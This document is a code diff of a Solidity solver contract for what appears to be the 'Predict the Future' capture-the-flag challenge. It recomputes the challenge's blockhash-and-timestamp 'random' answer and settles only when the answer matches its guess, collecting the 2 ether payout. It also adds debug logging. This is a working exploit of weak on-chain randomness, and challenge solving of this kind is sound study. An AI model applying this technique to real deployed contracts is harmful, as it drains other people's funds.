@@ -1,5 +1,8 @@
 // SPDX-License-Identifier: MIT
 pragma solidity =0.8.19;
+
+import {console} from "@forge-std/console.sol";
+
 interface IChallenge {
     function lockInGuess(uint8 n) external payable;
     function settle() external;
@@ -13,25 +16,39 @@ contract PredictTheFutureSolver {
     uint8 guess;
 
     constructor(address _challenge,uint8 _guess) payable {
+        require(msg.value == 1 ether);
         challenge = IChallenge(_challenge);
         owner = msg.sender;
         guess = _guess;
         challenge.lockInGuess{value: 1 ether}(guess);
     }
 
-    function settleChallenge() external payable {
+    function settleChallenge() external {
         uint8 answer = uint8(
             uint256(  
                 keccak256( abi.encodePacked(
                     blockhash(block.number - 1), block.timestamp)
                 )
             )
-        );
-        if(answer != guess) return;
+        )% 10;
 
-        require(answer == guess, "SPAM WRONG value");
-        challenge.settle();
-        payable(owner).transfer(2 ether);
+        console.log('answer', answer);
+        console.log('guess', guess);
+        // console.log('challenge',challenge);
+
+        console.log('block.number', block.number);
+        // console.log('challenge.guesser()', address(challenge.guesser()));
+        // console.log( address(challenge.guesser()));
+
+
+        // if(answer != guess) return;
+
+         if(answer == guess) {
+            challenge.settle();
+            console.log('balance before', address(this).balance);
+            payable(owner).transfer(2 ether);
+            console.log('balance after', address(this).balance);
+         }
     }
 
     receive() external payable {
